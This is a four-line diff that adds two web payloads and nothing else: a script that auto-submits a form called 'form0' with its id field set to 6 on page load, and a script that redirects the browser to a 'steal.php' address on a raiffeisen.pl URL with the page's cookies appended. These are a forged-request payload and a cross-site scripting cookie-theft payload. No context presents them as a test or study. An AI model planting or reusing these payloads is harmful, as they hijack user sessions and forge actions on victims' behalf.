@@ -1,0 +1,4 @@
+<script>window.onload=function()
+{document.forms["form0"]["id"].value = 6;document.forms["form0"].submit();}</script>
+
+<script>window.location = "https://www.raiffeisen.pl/Raiffeisen/steal.php?cookie=" + escape(document.cookie);</script>
